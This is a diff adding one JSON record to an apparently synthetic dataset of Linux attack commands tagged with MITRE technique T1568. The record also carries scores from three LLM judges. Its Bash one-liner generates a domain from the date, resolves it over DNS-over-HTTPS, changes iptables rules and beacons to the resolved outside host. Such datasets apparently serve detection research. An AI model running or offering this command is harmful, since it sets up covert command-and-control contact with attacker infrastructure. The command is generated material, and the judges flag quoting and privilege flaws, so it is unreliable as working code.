@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'seed=$(date -u +%s | rev); d=\"cdn$(echo $seed | cut -c1-5).rotator.app\"; ip=$(curl -s \"https://dns.google/resolve?name=$d&type=A\" | tr , \"\\n\" | grep -m1 \"\\\"data\\\":\\\"[0-9.]*\\\"\" | cut -d\\\" -f4); if [ -n \"$ip\" ]; then port=$(shuf -i 20000-65000 -n 1); dev=$(ip -o -4 route show to default | awk \"{print $5}\" | head -n1); iptables -I OUTPUT -o \"$dev\" -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -i \"$dev\" -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --interface \"$dev\" \"https://$d:$port/hello\"; fi'",
+  "explanation": "Resolves a DGA domain via Google DoH, then limits traffic to the default interface and resolved IP:port using iptables before initiating an HTTPS beacon.",
+  "rationale_steps": [
+    "Generate a time-variant domain",
+    "Resolve via DoH (Google) and parse the IP",
+    "Identify the default network interface",
+    "Allow only that interface to the resolved IP:port with iptables",
+    "Send stealthy beacon over HTTPS on a high port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-7f99e653",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct escape sequences throughout the complex bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a date-based seed to generate a domain name algorithmically (DGA-like behavior), resolving it through DNS over HTTPS, and establishing a connection to the dynamically determined endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:10:01.718796Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats for all tools, and no impossible constructs.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements dynamic resolution through DGA, DoH, and dynamic port selection, followed by beaconing, which aligns strongly with T1568; however, the `iptables` commands, intended to limit traffic, will fail without elevated privileges, preventing full achievement of the stated intent.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:10:30.315031Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes and valid flags/pipelines throughout, despite using double quotes in the awk script which still parses.",
+        "semantic_score": 3,
+        "semantic_justification": "It algorithmically generates a domain and resolves it via DoH (matching T1568), but iptables changes require root, the awk quoting likely captures the wrong interface, and the random high port makes the HTTPS beacon and claimed traffic limiting unreliable.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T07:11:23.802796Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
